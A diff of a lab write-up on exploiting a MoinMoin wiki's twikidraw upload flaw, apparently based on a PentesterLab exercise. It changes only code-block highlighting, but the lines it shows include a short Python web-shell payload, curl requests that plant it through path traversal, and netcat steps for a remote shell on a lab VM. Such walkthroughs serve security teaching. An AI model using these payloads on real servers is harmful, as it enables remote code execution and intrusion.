@@ -49,7 +49,7 @@ From `GNU and old GNU tar format <https://www.gnu.org/software/tar/manual/html_c
 This leads to filenames longer than 100 bytes **not** being the first bytes in a tar file containing exactly 1 file:
 
 .. code-block:: bash
-  :emphasize-lines: 1
+  :emphasize-lines: 1,8-10,12,18-
 
   # 100 byte filenames start the tar archive
   NAME100=$(printf "0123456789%.0s" {0..9})
@@ -87,7 +87,7 @@ The exploit is based on a file upload that is stored in a tar archive where:
 Here is a simple python script to execute a shell command:
 
 .. code-block:: bash
-  :emphasize-lines: 1
+  :emphasize-lines: 3
 
   import os
   def execute(pagename, request):
@@ -97,7 +97,7 @@ Here is a simple python script to execute a shell command:
 But this code must have the filename "drawing[.ext]" where "drawing" is fixed and the extension we can control. Here goes the next attempt:
 
 .. code-block:: bash
-  :emphasize-lines: 1
+  :emphasize-lines: 1,7-
 
   cat > cmd.py <<'EOF'
   drawing.z if()else()
@@ -113,7 +113,7 @@ But this code must have the filename "drawing[.ext]" where "drawing" is fixed an
 That's too long, so reaching in the python bag of tricks, this does the job:
 
 .. code-block:: bash
-  :emphasize-lines: 1
+  :emphasize-lines: 1,5-
 
   cat > payload.py <<'EOF'
   drawing.r if()else()
@@ -121,6 +121,8 @@ That's too long, so reaching in the python bag of tricks, this does the job:
   def execute(p,r):exec"print>>r,os\56popen(r\56values['c'])\56read()"
   EOF
   wc -c payload.py
+  # OUTPUT:
+  # 100
 
 It's actually possible to shrink the size down even further by passing the shell command in the HTTP Host header (``Host: uname -a``), but we won't do that.
 
@@ -131,7 +133,7 @@ Getting the form parameters
 Normally you'd use something like :program:`zap` or :program:`burpsuite` to intercept browser traffic and determine the form parameters. Since you probably don't have a Java-capable browser handy, you can run the PentesterLab ruby exploit and use ``ngrep`` to capture the form traffic. NOTE: the code has 1 correction from the original PentesterLab writeup:
 
 .. code-block:: bash
-  :emphasize-lines: 32-34
+  :emphasize-lines: 31-33
 
   # Update /etc/hosts to have vulnerable host
   IP=192.168.122.99
@@ -191,7 +193,7 @@ Normally you'd use something like :program:`zap` or :program:`burpsuite` to inte
 In one terminal window start ``ngrep``:
 
 .. code-block:: bash
-  :emphasize-lines: 1
+  :emphasize-lines: 2-
 
   LINK=virbr0
   sudo ngrep -l -p -d $LINK \
@@ -207,7 +209,7 @@ In another terminal run the ruby exploit:
 The captured data is:
 
 .. code-block:: text
-  :emphasize-lines: 1
+  :emphasize-lines: 2-4,6-
 
   #####################################
   T 192.168.122.1:52262 -> 192.168.122.99:80 [AP] #144
@@ -227,7 +229,7 @@ The captured data is:
 Cleaned up the POST looks like:
 
 .. code-block:: text
-  :emphasize-lines: 1
+  :emphasize-lines: 1,7,10-11,13,16
 
   POST /moin/WikiSandBox?action=twikidraw&do=save&ticket=&target=../../../../data/plugin/action/moinexec.py HTTP/1.1
   Host: vulnerable
@@ -250,7 +252,7 @@ Cleaned up the POST looks like:
 When done, stop the ``ngrep`` capture. The first HTTP request is equivalent to this ``curl``:
 
 .. code-block:: bash
-  :emphasize-lines: 1
+  :emphasize-lines: 1-
 
   curl --silent --get http://$TARGET/moin/WikiSandBox \
     --data-urlencode action=twikidraw \
@@ -260,7 +262,7 @@ When done, stop the ``ngrep`` capture. The first HTTP request is equivalent to t
 From the ruby code, the whole purpose of this is to get a ticket to be used in the second request. Here goes the gist of the second request (note that TICKET and PAYLOAD strings haven't been defined yet):
 
 .. code-block:: bash
-  :emphasize-lines: 1
+  :emphasize-lines: 1-
 
   curl -v --silent "http://$TARGET/moin/WikiSandBox?action=twikidraw&do=save&ticket=$TICKET&target=../../../../data/plugin/action/moinexec.py" \
     --form filename="$PAYLOAD" \
@@ -281,7 +283,7 @@ Upload the python exploit
 This uploads the python exploit. Make sure that the target file does not already exist (delete it or choose an unused filename if it does).
 
 .. code-block:: bash
-  :emphasize-lines: 1
+  :emphasize-lines: 4-8,11-15,20-
 
   # NOTE: vulnerable must be in /etc/hosts
   TARGET=vulnerable
@@ -314,7 +316,7 @@ The reverse shell
 In one terminal window start up a shell using ``nc``:
 
 .. code-block:: bash
-  :emphasize-lines: 1
+  :emphasize-lines: 4
 
   TARGET=vulnerable
   curl --silent "http://$TARGET/moin/WikiSandBox" \
@@ -324,7 +326,7 @@ In one terminal window start up a shell using ``nc``:
 In another terminal window connect to the reverse shell:
 
 .. code-block:: bash
-  :emphasize-lines: 1
+  :emphasize-lines: 3
 
   TARGET=vulnerable
   PORT=9999
